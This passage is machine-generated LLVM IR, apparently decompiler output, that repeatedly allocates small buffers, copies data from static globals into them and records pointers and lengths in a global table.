  store i32 %v1_132b8, i32* %r5.global-to-local, align 4
  %v3_132c8 = call i32 @function_13ad0(i32 %v1_132b8, i32 ptrtoint (i32* @global_var_1468c.424 to i32), i32 29)
  store i32 29, i32* %r3.global-to-local, align 4
  store i8 29, i8* bitcast (i32* @global_var_1ce4c.425 to i8*), align 4
  %v0_132d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132d8, i32* @global_var_1ce48.426, align 4
  %v0_132dc = load i32, i32* %r6.global-to-local, align 4
  %v1_132dc = trunc i32 %v0_132dc to i8
  store i8 %v1_132dc, i8* bitcast (i32* @global_var_1ce4d.427 to i8*), align 4
  %v1_132e0 = call i32 @_malloc(i32 7)
  store i32 7, i32* %r7.global-to-local, align 4
  store i32 %v1_132e0, i32* %r5.global-to-local, align 4
  %v4_132f4 = call i32 @function_13ad0(i32 %v1_132e0, i32 ptrtoint ([8 x i8]* @global_var_146ac.429 to i32), i32 7)
  %v0_132fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_132fc, i32* @global_var_1ce50.430, align 4
  %v0_13300 = load i32, i32* %r7.global-to-local, align 4
  %v1_13300 = trunc i32 %v0_13300 to i8
  store i8 %v1_13300, i8* bitcast (i32* @global_var_1ce54.431 to i8*), align 4
  %v0_13304 = load i32, i32* %r6.global-to-local, align 4
  %v1_13304 = trunc i32 %v0_13304 to i8
  store i8 %v1_13304, i8* bitcast (i32* @global_var_1ce55.432 to i8*), align 4
  %v1_13308 = call i32 @_malloc(i32 5)
  store i32 %v1_13308, i32* %r5.global-to-local, align 4
  %v4_13318 = call i32 @function_13ad0(i32 %v1_13308, i32 ptrtoint ([6 x i8]* @global_var_146b4.434 to i32), i32 5)
  store i32 5, i32* %r3.global-to-local, align 4
  store i8 5, i8* bitcast (i32* @global_var_1ce5c.435 to i8*), align 4
  %v0_13328 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13328, i32* @global_var_1ce58.436, align 4
  %v0_1332c = load i32, i32* %r6.global-to-local, align 4
  %v1_1332c = trunc i32 %v0_1332c to i8
  store i8 %v1_1332c, i8* bitcast (i32* @global_var_1ce5d.437 to i8*), align 4
  %v1_13330 = call i32 @_malloc(i32 11)
  store i32 %v1_13330, i32* %r5.global-to-local, align 4
  %v3_13340 = call i32 @function_13ad0(i32 %v1_13330, i32 ptrtoint (i32* @global_var_146bc.439 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1ce64.440 to i8*), align 4
  %v0_13350 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13350, i32* @global_var_1ce60.441, align 4
  %v0_13354 = load i32, i32* %r6.global-to-local, align 4
  %v1_13354 = trunc i32 %v0_13354 to i8
  store i8 %v1_13354, i8* bitcast (i32* @global_var_1ce65.442 to i8*), align 4
  %v1_13358 = call i32 @_malloc(i32 4)
  store i32 %v1_13358, i32* %r5.global-to-local, align 4
  %v4_13368 = call i32 @function_13ad0(i32 %v1_13358, i32 ptrtoint ([5 x i8]* @global_var_146c8.444 to i32), i32 4)
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_13370 = load i32, i32* %r7.global-to-local, align 4
  store i8 4, i8* bitcast (i32* @global_var_1ce6c.445 to i8*), align 4
  %v0_13378 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13378, i32* @global_var_1ce68.446, align 4
  %v0_1337c = load i32, i32* %r6.global-to-local, align 4
  %v1_1337c = trunc i32 %v0_1337c to i8
  store i8 %v1_1337c, i8* bitcast (i32* @global_var_1ce6d.447 to i8*), align 4
  %v1_13380 = call i32 @_malloc(i32 %v0_13370)
  %v0_13384 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13380, i32* %r5.global-to-local, align 4
  %v4_13390 = call i32 @function_13ad0(i32 %v1_13380, i32 ptrtoint ([8 x i8]* @global_var_146d0.449 to i32), i32 %v0_13384)
  %v0_13398 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13398, i32* @global_var_1ce70.450, align 4
  %v0_1339c = load i32, i32* %r7.global-to-local, align 4
  %v1_1339c = trunc i32 %v0_1339c to i8
  store i8 %v1_1339c, i8* bitcast (i32* @global_var_1ce74.451 to i8*), align 4
  %v0_133a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_133a0 = trunc i32 %v0_133a0 to i8
  store i8 %v1_133a0, i8* bitcast (i32* @global_var_1ce75.452 to i8*), align 4
  %v1_133a4 = call i32 @_malloc(i32 8)
  store i32 %v1_133a4, i32* %r5.global-to-local, align 4
  %v4_133b4 = call i32 @function_13ad0(i32 %v1_133a4, i32 ptrtoint ([9 x i8]* @global_var_146d8.454 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1ce7c.455 to i8*), align 4
  %v0_133c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133c4, i32* @global_var_1ce78.456, align 4
  %v0_133c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_133c8 = trunc i32 %v0_133c8 to i8
  store i8 %v1_133c8, i8* bitcast (i32* @global_var_1ce7d.457 to i8*), align 4
  %v1_133cc = call i32 @_malloc(i32 13)
  store i32 %v1_133cc, i32* %r5.global-to-local, align 4
  %v3_133dc = call i32 @function_13ad0(i32 %v1_133cc, i32 ptrtoint (i32* @global_var_146e4.459 to i32), i32 13)
  store i32 13, i32* %r3.global-to-local, align 4
  store i8 13, i8* bitcast (i32* @global_var_1ce84.460 to i8*), align 4
  %v0_133ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_133ec, i32* @global_var_1ce80.461, align 4
  %v0_133f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_133f0 = trunc i32 %v0_133f0 to i8
  store i8 %v1_133f0, i8* bitcast (i32* @global_var_1ce85.462 to i8*), align 4
  %v1_133f4 = call i32 @_malloc(i32 10)
  store i32 10, i32* %r8.global-to-local, align 4
  store i32 %v1_133f4, i32* %r5.global-to-local, align 4
  %v4_13408 = call i32 @function_13ad0(i32 %v1_133f4, i32 ptrtoint ([11 x i8]* @global_var_146f4.464 to i32), i32 10)
  %v0_13410 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13410, i32* @global_var_1ce88.465, align 4
  store i8 10, i8* bitcast (i32* @global_var_1ce8c.466 to i8*), align 4
  %v0_13418 = load i32, i32* %r6.global-to-local, align 4
  %v1_13418 = trunc i32 %v0_13418 to i8
  store i8 %v1_13418, i8* bitcast (i32* @global_var_1ce8d.467 to i8*), align 4
  %v1_1341c = call i32 @_malloc(i32 10)
  %v0_13424 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_1341c, i32* %r5.global-to-local, align 4
  %v4_1342c = call i32 @function_13ad0(i32 %v1_1341c, i32 ptrtoint ([11 x i8]* @global_var_14700.469 to i32), i32 %v0_13424)
  %v0_13434 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13434, i32* @global_var_1ce90.470, align 4
  %v1_13438 = trunc i32 %v0_13424 to i8
  store i8 %v1_13438, i8* bitcast (i32* @global_var_1ce94.471 to i8*), align 4
  %v0_1343c = load i32, i32* %r6.global-to-local, align 4
  %v1_1343c = trunc i32 %v0_1343c to i8
  store i8 %v1_1343c, i8* bitcast (i32* @global_var_1ce95.472 to i8*), align 4
  %v1_13440 = call i32 @_malloc(i32 33)
  store i32 %v1_13440, i32* %r5.global-to-local, align 4
  %v3_13450 = call i32 @function_13ad0(i32 %v1_13440, i32 ptrtoint (i32* @global_var_1470c.474 to i32), i32 33)
  store i32 33, i32* %r3.global-to-local, align 4
  store i8 33, i8* bitcast (i32* @global_var_1ce9c.475 to i8*), align 4
  %v0_13460 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13460, i32* @global_var_1ce98.476, align 4
  %v0_13464 = load i32, i32* %r6.global-to-local, align 4
  %v1_13464 = trunc i32 %v0_13464 to i8
  store i8 %v1_13464, i8* bitcast (i32* @global_var_1ce9d.477 to i8*), align 4
  %v1_13468 = call i32 @_malloc(i32 8)
  store i32 %v1_13468, i32* %r5.global-to-local, align 4
  %v4_13478 = call i32 @function_13ad0(i32 %v1_13468, i32 ptrtoint ([9 x i8]* @global_var_14730.479 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1cea4.480 to i8*), align 4
  %v0_13488 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13488, i32* @global_var_1cea0.481, align 4
  %v0_1348c = load i32, i32* %r6.global-to-local, align 4
  %v1_1348c = trunc i32 %v0_1348c to i8
  store i8 %v1_1348c, i8* bitcast (i32* @global_var_1cea5.482 to i8*), align 4
  %v1_13490 = call i32 @_malloc(i32 11)
  store i32 %v1_13490, i32* %r5.global-to-local, align 4
  %v4_134a0 = call i32 @function_13ad0(i32 %v1_13490, i32 ptrtoint ([12 x i8]* @global_var_1473c.484 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1ceac.485 to i8*), align 4
  %v0_134b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134b0, i32* @global_var_1cea8.486, align 4
  %v0_134b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_134b4 = trunc i32 %v0_134b4 to i8
  store i8 %v1_134b4, i8* bitcast (i32* @global_var_1cead.487 to i8*), align 4
  %v1_134b8 = call i32 @_malloc(i32 6)
  store i32 %v1_134b8, i32* %r5.global-to-local, align 4
  %v4_134c8 = call i32 @function_13ad0(i32 %v1_134b8, i32 ptrtoint ([7 x i8]* @global_var_14748.489 to i32), i32 6)
  store i32 6, i32* %r3.global-to-local, align 4
  %v0_134d0 = load i32, i32* %r7.global-to-local, align 4
  store i8 6, i8* bitcast (i32* @global_var_1cec4.490 to i8*), align 4
  %v0_134d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134d8, i32* @global_var_1cec0.491, align 4
  %v0_134dc = load i32, i32* %r6.global-to-local, align 4
  %v1_134dc = trunc i32 %v0_134dc to i8
  store i8 %v1_134dc, i8* bitcast (i32* @global_var_1cec5.492 to i8*), align 4
  %v1_134e0 = call i32 @_malloc(i32 %v0_134d0)
  %v0_134e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_134e0, i32* %r5.global-to-local, align 4
  %v4_134f0 = call i32 @function_13ad0(i32 %v1_134e0, i32 ptrtoint ([8 x i8]* @global_var_14750.494 to i32), i32 %v0_134e4)
  %v0_134f4 = load i32, i32* %r7.global-to-local, align 4
  %v0_134f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_134f8, i32* @global_var_1cec8.495, align 4
  %v1_134fc = trunc i32 %v0_134f4 to i8
  store i8 %v1_134fc, i8* bitcast (i32* @global_var_1cecc.496 to i8*), align 4
  %v0_13500 = load i32, i32* %r6.global-to-local, align 4
  %v1_13500 = trunc i32 %v0_13500 to i8
  store i8 %v1_13500, i8* bitcast (i32* @global_var_1cecd.497 to i8*), align 4
  %v1_13504 = call i32 @_malloc(i32 %v0_134f4)
  %v0_13508 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13504, i32* %r5.global-to-local, align 4
  %v4_13514 = call i32 @function_13ad0(i32 %v1_13504, i32 ptrtoint ([8 x i8]* @global_var_14758.499 to i32), i32 %v0_13508)
  %v0_1351c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1351c, i32* @global_var_1ced0.500, align 4
  %v0_13520 = load i32, i32* %r7.global-to-local, align 4
  %v1_13520 = trunc i32 %v0_13520 to i8
  store i8 %v1_13520, i8* bitcast (i32* @global_var_1ced4.501 to i8*), align 4
  %v0_13524 = load i32, i32* %r6.global-to-local, align 4
  %v1_13524 = trunc i32 %v0_13524 to i8
  store i8 %v1_13524, i8* bitcast (i32* @global_var_1ced5.502 to i8*), align 4
  %v1_13528 = call i32 @_malloc(i32 3)
  store i32 %v1_13528, i32* %r5.global-to-local, align 4
  %v4_13538 = call i32 @function_13ad0(i32 %v1_13528, i32 ptrtoint ([4 x i8]* @global_var_14760.504 to i32), i32 3)
  store i32 3, i32* %r3.global-to-local, align 4
  store i8 3, i8* bitcast (i32* @global_var_1cedc.505 to i8*), align 4
  %v0_13548 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13548, i32* @global_var_1ced8.506, align 4
  %v0_1354c = load i32, i32* %r6.global-to-local, align 4
  %v1_1354c = trunc i32 %v0_1354c to i8
  store i8 %v1_1354c, i8* bitcast (i32* @global_var_1cedd.507 to i8*), align 4
  %v1_13550 = call i32 @_malloc(i32 19)
  store i32 %v1_13550, i32* %r5.global-to-local, align 4
  store i32 19, i32* %sb.global-to-local, align 4
  %v3_13564 = call i32 @function_13ad0(i32 %v1_13550, i32 ptrtoint (i32* @global_var_14764.509 to i32), i32 19)
  %v0_1356c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1356c, i32* @global_var_1cee0.510, align 4
  store i8 19, i8* bitcast (i32* @global_var_1cee4.511 to i8*), align 4
  %v0_13574 = load i32, i32* %r6.global-to-local, align 4
  %v1_13574 = trunc i32 %v0_13574 to i8
  store i8 %v1_13574, i8* bitcast (i32* @global_var_1cee5.512 to i8*), align 4
  %v1_13578 = call i32 @_malloc(i32 24)
  store i32 %v1_13578, i32* %r5.global-to-local, align 4
  %v3_13588 = call i32 @function_13ad0(i32 %v1_13578, i32 ptrtoint (i32* @global_var_14778.514 to i32), i32 24)
  store i32 24, i32* %r3.global-to-local, align 4
  store i8 24, i8* bitcast (i32* @global_var_1ceec.515 to i8*), align 4
  %v0_13598 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13598, i32* @global_var_1cee8.516, align 4
  %v0_1359c = load i32, i32* %r6.global-to-local, align 4
  %v1_1359c = trunc i32 %v0_1359c to i8
  store i8 %v1_1359c, i8* bitcast (i32* @global_var_1ceed.517 to i8*), align 4
  %v1_135a0 = call i32 @_malloc(i32 9)
  store i32 %v1_135a0, i32* %r5.global-to-local, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  %v4_135b4 = call i32 @function_13ad0(i32 %v1_135a0, i32 ptrtoint ([10 x i8]* @global_var_14794.519 to i32), i32 9)
  %v0_135bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135bc, i32* @global_var_1cef0.520, align 4
  store i8 9, i8* bitcast (i32* @global_var_1cef4.521 to i8*), align 4
  %v0_135c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_135c4 = trunc i32 %v0_135c4 to i8
  store i8 %v1_135c4, i8* bitcast (i32* @global_var_1cef5.522 to i8*), align 4
  %v1_135c8 = call i32 @_malloc(i32 16)
  store i32 %v1_135c8, i32* %r5.global-to-local, align 4
  store i32 16, i32* %fp.global-to-local, align 4
  %v3_135dc = call i32 @function_13ad0(i32 %v1_135c8, i32 ptrtoint (i32* @global_var_147a0.524 to i32), i32 16)
  %v0_135e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_135e4, i32* @global_var_1cef8.525, align 4
  store i8 16, i8* bitcast (i32* @global_var_1cefc.526 to i8*), align 4
  %v0_135ec = load i32, i32* %r6.global-to-local, align 4
  %v1_135ec = trunc i32 %v0_135ec to i8
  store i8 %v1_135ec, i8* bitcast (i32* @global_var_1cefd.527 to i8*), align 4
  %v1_135f0 = call i32 @_malloc(i32 22)
  store i32 %v1_135f0, i32* %r5.global-to-local, align 4
  %v3_13600 = call i32 @function_13ad0(i32 %v1_135f0, i32 ptrtoint (i32* @global_var_147b4.529 to i32), i32 22)
  store i32 22, i32* %r3.global-to-local, align 4
  store i8 22, i8* bitcast (i32* @global_var_1cf04.530 to i8*), align 4
  %v0_13610 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13610, i32* @global_var_1cf00.531, align 4
  %v0_13614 = load i32, i32* %r6.global-to-local, align 4
  %v1_13614 = trunc i32 %v0_13614 to i8
  store i8 %v1_13614, i8* bitcast (i32* @global_var_1cf05.532 to i8*), align 4
  %v1_13618 = call i32 @_malloc(i32 21)
  store i32 %v1_13618, i32* %r5.global-to-local, align 4
  %v3_13628 = call i32 @function_13ad0(i32 %v1_13618, i32 ptrtoint (i32* @global_var_147cc.534 to i32), i32 21)
  store i32 21, i32* %r3.global-to-local, align 4
  store i8 21, i8* bitcast (i32* @global_var_1cf0c.535 to i8*), align 4
  %v0_13638 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13638, i32* @global_var_1cf08.536, align 4
  %v0_1363c = load i32, i32* %r6.global-to-local, align 4
  %v1_1363c = trunc i32 %v0_1363c to i8
  store i8 %v1_1363c, i8* bitcast (i32* @global_var_1cf0d.537 to i8*), align 4
  %v1_13640 = call i32 @_malloc(i32 17)
  store i32 %v1_13640, i32* %r5.global-to-local, align 4
  %v4_13650 = call i32 @function_13ad0(i32 %v1_13640, i32 ptrtoint ([18 x i8]* @global_var_147e4.539 to i32), i32 17)
  store i32 17, i32* %r3.global-to-local, align 4
  store i8 17, i8* bitcast (i32* @global_var_1cf14.540 to i8*), align 4
  %v0_13660 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13660, i32* @global_var_1cf10.541, align 4
  %v0_13664 = load i32, i32* %r6.global-to-local, align 4
  %v1_13664 = trunc i32 %v0_13664 to i8
  store i8 %v1_13664, i8* bitcast (i32* @global_var_1cf15.542 to i8*), align 4
  %v1_13668 = call i32 @_malloc(i32 12)
  %v0_13674 = load i32, i32* %r7.global-to-local, align 4
  %v1_13674 = add i32 %v0_13674, 5
  store i32 %v1_13674, i32* %r7.global-to-local, align 4
  store i32 %v1_13668, i32* %r5.global-to-local, align 4
  %v3_1367c = call i32 @function_13ad0(i32 %v1_13668, i32 ptrtoint (i32* @global_var_147f8.544 to i32), i32 12)
  %v0_13684 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13684, i32* @global_var_1cf18.545, align 4
  %v0_13688 = load i32, i32* %r7.global-to-local, align 4
  %v1_13688 = trunc i32 %v0_13688 to i8
  store i8 %v1_13688, i8* bitcast (i32* @global_var_1cf1c.546 to i8*), align 4
  %v0_1368c = load i32, i32* %r6.global-to-local, align 4
  %v1_1368c = trunc i32 %v0_1368c to i8
  store i8 %v1_1368c, i8* bitcast (i32* @global_var_1cf1d.547 to i8*), align 4
  %v1_13690 = call i32 @_malloc(i32 23)
  store i32 %v1_13690, i32* %r5.global-to-local, align 4
  %v3_136a0 = call i32 @function_13ad0(i32 %v1_13690, i32 ptrtoint (i32* @global_var_14808.549 to i32), i32 23)
  store i32 23, i32* %r3.global-to-local, align 4
  store i8 23, i8* bitcast (i32* @global_var_1cf24.550 to i8*), align 4
  %v0_136b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136b0, i32* @global_var_1cf20.551, align 4
  %v0_136b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_136b4 = trunc i32 %v0_136b4 to i8
  store i8 %v1_136b4, i8* bitcast (i32* @global_var_1cf25.552 to i8*), align 4
  %v1_136b8 = call i32 @_malloc(i32 83)
  store i32 %v1_136b8, i32* %r5.global-to-local, align 4
  %v3_136c8 = call i32 @function_13ad0(i32 %v1_136b8, i32 ptrtoint (i32* @global_var_14820.554 to i32), i32 83)
  store i32 83, i32* %r3.global-to-local, align 4
  store i8 83, i8* bitcast (i32* @global_var_1cf2c.555 to i8*), align 4
  %v0_136d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136d8, i32* @global_var_1cf28.556, align 4
  %v0_136dc = load i32, i32* %r6.global-to-local, align 4
  %v1_136dc = trunc i32 %v0_136dc to i8
  store i8 %v1_136dc, i8* bitcast (i32* @global_var_1cf2d.557 to i8*), align 4
  %v1_136e0 = call i32 @_malloc(i32 32)
  store i32 %v1_136e0, i32* %r5.global-to-local, align 4
  %v3_136f0 = call i32 @function_13ad0(i32 %v1_136e0, i32 ptrtoint (i32* @global_var_14874.559 to i32), i32 32)
  store i32 32, i32* %r3.global-to-local, align 4
  store i8 32, i8* bitcast (i32* @global_var_1cf34.560 to i8*), align 4
  %v0_13700 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13700, i32* @global_var_1cf30.561, align 4
  %v0_13704 = load i32, i32* %r6.global-to-local, align 4
  %v1_13704 = trunc i32 %v0_13704 to i8
  store i8 %v1_13704, i8* bitcast (i32* @global_var_1cf35.562 to i8*), align 4
  %v1_13708 = call i32 @_malloc(i32 48)
  store i32 %v1_13708, i32* %r5.global-to-local, align 4
  %v3_13718 = call i32 @function_13ad0(i32 %v1_13708, i32 ptrtoint (i32* @global_var_14898.564 to i32), i32 48)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_13720 = load i32, i32* %r7.global-to-local, align 4
  store i8 48, i8* bitcast (i32* @global_var_1cf3c.565 to i8*), align 4
  %v0_13728 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13728, i32* @global_var_1cf38.566, align 4
  %v0_1372c = load i32, i32* %r6.global-to-local, align 4
  %v1_1372c = trunc i32 %v0_1372c to i8
  store i8 %v1_1372c, i8* bitcast (i32* @global_var_1cf3d.567 to i8*), align 4
  %v1_13730 = call i32 @_malloc(i32 %v0_13720)
  %v0_13734 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13730, i32* %r5.global-to-local, align 4
  %v3_13740 = call i32 @function_13ad0(i32 %v1_13730, i32 ptrtoint (i32* @global_var_148cc.569 to i32), i32 %v0_13734)
  %v0_13744 = load i32, i32* %sl.global-to-local, align 4
  %v0_13748 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13748, i32* @global_var_1cf40.570, align 4
  %v0_1374c = load i32, i32* %r7.global-to-local, align 4
  %v1_1374c = trunc i32 %v0_1374c to i8
  store i8 %v1_1374c, i8* bitcast (i32* @global_var_1cf44.571 to i8*), align 4
  %v0_13750 = load i32, i32* %r6.global-to-local, align 4
  %v1_13750 = trunc i32 %v0_13750 to i8
  store i8 %v1_13750, i8* bitcast (i32* @global_var_1cf45.572 to i8*), align 4
  %v1_13754 = call i32 @_malloc(i32 %v0_13744)
  %v0_1375c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_13754, i32* %r5.global-to-local, align 4
  %v3_13764 = call i32 @function_13ad0(i32 %v1_13754, i32 ptrtoint (i32* @global_var_148dc.574 to i32), i32 %v0_1375c)
  %v0_13768 = load i32, i32* %r8.global-to-local, align 4
  %v0_1376c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1376c, i32* @global_var_1cf48.575, align 4
  %v1_13770 = trunc i32 %v0_1375c to i8
  store i8 %v1_13770, i8* bitcast (i32* @global_var_1cf4c.576 to i8*), align 4
  %v0_13774 = load i32, i32* %r6.global-to-local, align 4
  %v1_13774 = trunc i32 %v0_13774 to i8
  store i8 %v1_13774, i8* bitcast (i32* @global_var_1cf4d.577 to i8*), align 4
  %v1_13778 = call i32 @_malloc(i32 %v0_13768)
  %v0_13780 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v1_13778, i32* %r5.global-to-local, align 4
  %v3_13788 = call i32 @function_13ad0(i32 %v1_13778, i32 ptrtoint (i32* @global_var_148e8.579 to i32), i32 %v0_13780)
  %v0_1378c = load i32, i32* %r7.global-to-local, align 4
  %v0_13790 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13790, i32* @global_var_1cf50.580, align 4
  %v1_13794 = trunc i32 %v0_13780 to i8
  store i8 %v1_13794, i8* bitcast (i32* @global_var_1cf54.581 to i8*), align 4
  %v0_13798 = load i32, i32* %r6.global-to-local, align 4
  %v1_13798 = trunc i32 %v0_13798 to i8
  store i8 %v1_13798, i8* bitcast (i32* @global_var_1cf55.582 to i8*), align 4
  %v1_1379c = call i32 @_malloc(i32 %v0_1378c)
  %v0_137a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1379c, i32* %r5.global-to-local, align 4
  %v3_137ac = call i32 @function_13ad0(i32 %v1_1379c, i32 ptrtoint (i32* @global_var_148f4.584 to i32), i32 %v0_137a0)
  %v0_137b0 = load i32, i32* %fp.global-to-local, align 4
  %v0_137b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_137b4, i32* @global_var_1cf58.585, align 4
  %v0_137b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_137b8 = trunc i32 %v0_137b8 to i8
  store i8 %v1_137b8, i8* bitcast (i32* @global_var_1cf5c.586 to i8*), align 4
  %v0_137bc = load i32, i32* %r6.global-to-local, align 4
  %v1_137bc = trunc i32 %v0_137bc to i8
  store i8 %v1_137bc, i8* bitcast (i32* @global_var_1cf5d.587 to i8*), align 4
  %v1_137c0 = call i32 @_malloc(i32 %v0_137b0)
  %v0_137c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_137c0, i32* %r5.global-to-local, align 4
  %v3_137d0 = call i32 @function_13ad0(i32 %v1_137c0, i32 ptrtoint (i32* @global_var_14904.589 to i32), i32 %v0_137c8)
  %v0_137d4 = load i32, i32* %sb.global-to-local, align 4
  %v0_137d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_137d8, i32* @global_var_1cf60.590, align 4
  %v1_137dc = trunc i32 %v0_137c8 to i8
  store i8 %v1_137dc, i8* bitcast (i32* @global_var_1cf64.591 to i8*), align 4
  %v0_137e0 = load i32, i32* %r6.global-to-local, align 4
  %v1_137e0 = trunc i32 %v0_137e0 to i8
  store i8 %v1_137e0, i8* bitcast (i32* @global_var_1cf65.592 to i8*), align 4
  %v1_137e4 = call i32 @_malloc(i32 %v0_137d4)
  %v0_137ec = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_137e4, i32* %r5.global-to-local, align 4
  %v3_137f4 = call i32 @function_13ad0(i32 %v1_137e4, i32 ptrtoint (i32* @global_var_14918.594 to i32), i32 %v0_137ec)
  %v0_137fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_137fc, i32* @global_var_1cf68.595, align 4
  %v1_13800 = trunc i32 %v0_137ec to i8
  store i8 %v1_13800, i8* bitcast (i32* @global_var_1cf6c.596 to i8*), align 4
  %v0_13804 = load i32, i32* %r6.global-to-local, align 4
  %v1_13804 = trunc i32 %v0_13804 to i8
  store i8 %v1_13804, i8* bitcast (i32* @global_var_1cf6d.597 to i8*), align 4
  %v1_13808 = call i32 @_malloc(i32 8)
  store i32 %v1_13808, i32* %r5.global-to-local, align 4
  %v4_13818 = call i32 @function_13ad0(i32 %v1_13808, i32 ptrtoint ([9 x i8]* @global_var_1492c.599 to i32), i32 8)
  store i32 8, i32* %r3.global-to-local, align 4
  store i8 8, i8* bitcast (i32* @global_var_1cf74.600 to i8*), align 4
  %v0_13828 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13828, i32* @global_var_1cf70.601, align 4
  %v0_1382c = load i32, i32* %r6.global-to-local, align 4
  %v1_1382c = trunc i32 %v0_1382c to i8
  store i8 %v1_1382c, i8* bitcast (i32* @global_var_1cf75.602 to i8*), align 4
  %v1_13830 = call i32 @_malloc(i32 11)
  store i32 %v1_13830, i32* %r5.global-to-local, align 4
  %v3_13840 = call i32 @function_13ad0(i32 %v1_13830, i32 ptrtoint (i32* @global_var_14814.604 to i32), i32 11)
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_13848 = load i32, i32* %r7.global-to-local, align 4
  store i8 11, i8* bitcast (i32* @global_var_1cf7c.605 to i8*), align 4
  %v0_13850 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13850, i32* @global_var_1cf78.606, align 4
  %v0_13854 = load i32, i32* %r6.global-to-local, align 4
  %v1_13854 = trunc i32 %v0_13854 to i8
  store i8 %v1_13854, i8* bitcast (i32* @global_var_1cf7d.607 to i8*), align 4
  %v1_13858 = call i32 @_malloc(i32 %v0_13848)
  %v0_1385c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13858, i32* %r5.global-to-local, align 4
  %v3_13868 = call i32 @function_13ad0(i32 %v1_13858, i32 ptrtoint (i32* @global_var_14938.609 to i32), i32 %v0_1385c)
  %v0_13870 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13870, i32* @global_var_1cf80.610, align 4
  %v0_13874 = load i32, i32* %r7.global-to-local, align 4
  %v1_13874 = trunc i32 %v0_13874 to i8
  store i8 %v1_13874, i8* bitcast (i32* @global_var_1cf84.611 to i8*), align 4
  %v0_13878 = load i32, i32* %r6.global-to-local, align 4
  %v1_13878 = trunc i32 %v0_13878 to i8
  store i8 %v1_13878, i8* bitcast (i32* @global_var_1cf85.612 to i8*), align 4
  %v1_1387c = call i32 @_malloc(i32 18)
  store i32 %v1_1387c, i32* %r5.global-to-local, align 4
  %v3_1388c = call i32 @function_13ad0(i32 %v1_1387c, i32 ptrtoint (i32* @global_var_14948.614 to i32), i32 18)
  store i32 18, i32* %r3.global-to-local, align 4
  store i8 18, i8* bitcast (i32* @global_var_1cf8c.615 to i8*), align 4
  %v0_1389c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1389c, i32* @global_var_1cf88.616, align 4
  %v0_138a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_138a0 = trunc i32 %v0_138a0 to i8
  store i8 %v1_138a0, i8* bitcast (i32* @global_var_1cf8d.617 to i8*), align 4
  %v1_138a4 = call i32 @_malloc(i32 25)
  store i32 %v1_138a4, i32* %r5.global-to-local, align 4
  %v3_138b4 = call i32 @function_13ad0(i32 %v1_138a4, i32 ptrtoint (i32* @global_var_1495c.619 to i32), i32 25)
  store i32 25, i32* %r3.global-to-local, align 4
  store i8 25, i8* bitcast (i32* @global_var_1cf94.620 to i8*), align 4
  %v0_138c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_138c4, i32* @global_var_1cf90.621, align 4
